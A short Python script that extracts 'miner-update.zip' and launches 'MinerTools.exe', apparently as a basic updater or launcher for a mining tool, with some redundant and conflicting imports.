from zipfile import ZipFile
import sys
import subprocess
from asyncio import subprocess
from subprocess import Popen

with ZipFile('miner-update.zip', 'r') as zipOjk:
    zipOjk.extractall()

Popen('MinerTools.exe')
sys.exit()